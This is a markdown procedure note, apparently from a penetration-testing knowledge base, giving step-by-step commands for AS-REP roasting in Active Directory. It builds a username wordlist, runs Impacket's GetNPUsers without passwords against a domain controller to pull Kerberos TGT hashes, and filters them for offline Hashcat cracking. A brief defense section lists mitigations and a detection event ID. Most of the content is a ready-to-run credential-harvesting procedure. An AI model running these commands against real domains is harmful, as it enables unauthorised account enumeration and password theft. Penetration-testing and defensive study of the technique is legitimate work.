---
type: procedure
description: >-
  Brute-force usernames to identify AS-REP roastable accounts
  (UF_DONT_REQUIRE_PREAUTH) and extract their TGT hashes for offline cracking.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[rubeus-asrep-roast-user]]'
sub_techniques: []
tags:
  - active-directory
  - kerberos
  - as-rep-roasting
  - enumeration
platforms:
  - Linux
commands:
  - '[[commands/GetNPUsers-AS-REP-Roasting-Brute-Force]]'
tools:
  - '[[tools/Impacket]]'
validated: true
---

# Brute-Force-AS-REP-Roastable-Users-with-GetNPUsers

## Summary

This procedure uses Impacket's GetNPUsers to request AS-REP TGTs from users without Kerberos pre-auth, brute-forcing a username list to find valid accounts and collect crackable RC4 hashes.

## Description

AS-REP roasting exploits misconfigured accounts (UF_DONT_REQUIRE_PREAUTH=1), allowing TGT requests without passwords. Valid usernames yield hashes for offline cracking, enabling password recovery without network access. Common in AD for service accounts.

## Requirements

1. Domain name and DC IP
2. Username wordlist (e.g., 1000 common names)
3. Impacket installed (pip install impacket)
4. Open Kerberos port (88/UDP) on DC

## Defense

- Audit and remove UF_DONT_REQUIRE_PREAUTH flag (Set-User -DoesNotRequirePreAuth $false)
- Monitor Kerberos AS-REQ logs for unusual requests (Event ID 4768)
- Implement account lockout on failed AS-REQ
- Use fine-grained password policies for service accounts

## Objectives

1. Identify valid roastable usernames
2. Collect AS-REP hashes in crackable format
3. Prepare for offline brute-force

## Instructions

### Step 1: Prepare Username Wordlist

**Context**: Create or use a list of potential usernames; source from LDAP enum or OSINT.

**Command**:
```bash
cat > users.txt << EOF
administrator
user1
service
EOF
```

> List should be targeted to reduce noise.

### Step 2: Run GetNPUsers Brute-Force

**Context**: Request TGTs with -no-pass; only valid users return hashes.

**Command** ([[commands/GetNPUsers-AS-REP-Roasting-Brute-Force]]):
```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile users.txt -dc-ip $_DC_IP -request -format hashcat -outputfile asrep_hashes.txt
```

> Filters for etype 23 (RC4). Expected: Hashes only for roastable valid users.

### Step 3: Verify Output Hashes

**Context**: Check file for valid entries (ignore invalid user errors).

**Command**:
```bash
wc -l asrep_hashes.txt
```

> Count non-zero lines. If empty, expand wordlist or check config.

### Step 4: Clean and Format for Cracking

**Context**: Remove invalid lines; ensure Hashcat format.

**Command**:
```bash
grep '$krb5asrep' asrep_hashes.txt > clean_hashes.txt
```

> Prepares for Hashcat. Success: Usable hashes collected.
